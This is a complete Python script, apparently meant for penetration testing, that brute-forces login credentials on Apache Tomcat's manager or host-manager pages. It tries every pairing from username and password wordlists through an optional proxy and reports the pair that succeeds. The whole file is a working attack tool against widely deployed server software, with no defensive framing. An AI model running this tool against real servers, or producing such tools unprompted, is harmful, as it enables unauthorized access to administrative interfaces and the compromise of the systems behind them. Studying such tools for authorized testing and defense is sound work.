#!/usr/bin/python

import requests  # Import the requests library to make HTTP requests
import argparse  # Import argparse library to parse command-line arguments
import sys  # Import sys for using stdout to print dynamic messages

# Set up command-line argument parsing
parser = argparse.ArgumentParser(description="Tomcat manager or host-manager credential bruteforcing")

# Define command-line arguments
parser.add_argument("-U", "--url", type=str, required=True, help="URL to tomcat page")
parser.add_argument("-P", "--path", type=str, required=True, help="manager or host-manager URI")
parser.add_argument("-u", "--usernames", type=str, required=True, help="Users File")
parser.add_argument("-p", "--passwords", type=str, required=True, help="Passwords Files")
parser.add_argument("--proxy", type=str, required=False, help="Proxy address (e.g., http://127.0.0.1:8080)")

# Parse the arguments provided by the user
args = parser.parse_args()

# Assign the parsed arguments to variables
url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords
proxy_address = args.proxy

# Configure the proxy if provided
proxies = {}
if proxy_address:
    proxies = {
        "http": proxy_address,
        "https": proxy_address,
    }

# Concatenate the URL and URI to form the complete endpoint for bruteforcing
new_url = url + uri

# Open the usernames and passwords files, read lines, strip whitespace, and store in lists
with open(users_file, "rb") as f_users:
    usernames = [x.strip() for x in f_users]
with open(passwords_file, "rb") as f_pass:
    passwords = [x.strip() for x in f_pass]

# Calculate the total number of attempts by multiplying the number of usernames and passwords
total_attempts = len(usernames) * len(passwords)

# Notify the user that the attack is starting
print("\n[+] Attacking.....")

# Initialize a variable to count the number of attempts made
attempt_count = 0

# Nested loop to iterate over each username and password combination
for u in usernames:
    for p in passwords:
        # Increment the attempt counter for each username-password pair tried
        attempt_count += 1

        # Dynamically print the current attempt number, total attempts, and the username-password being tried
        # '\r' returns the cursor to the start of the line, and end='' prevents a new line from being started
        message = f"\rAttempt {attempt_count} of {total_attempts}: Trying username '{u.decode()}' with password '{p.decode()}'\033[K"
        sys.stdout.write(message)
        sys.stdout.flush()  # Ensure the output is immediately visible

        # Make an HTTP GET request with the current username-password pair for authentication
        r = requests.get(new_url, auth=(u, p), proxies=proxies)

        # Check if the response status code is 200 (OK), indicating successful authentication
        if r.status_code == 200:
            # If successful, print a success message and the credentials that worked
            print("\n\n[+] Success!!")
            print(f"[+] Username: {u.decode()}\n[+] Password: {p.decode()}")
            break  # Exit the inner loop on success
    if r.status_code == 200:
        break  # Exit the outer loop on success

# If none of the username-password pairs worked, print a failure message
if r.status_code != 200:
    print("\n\n[+] Failed!!")
    print("[+] Could not Find the creds :(")

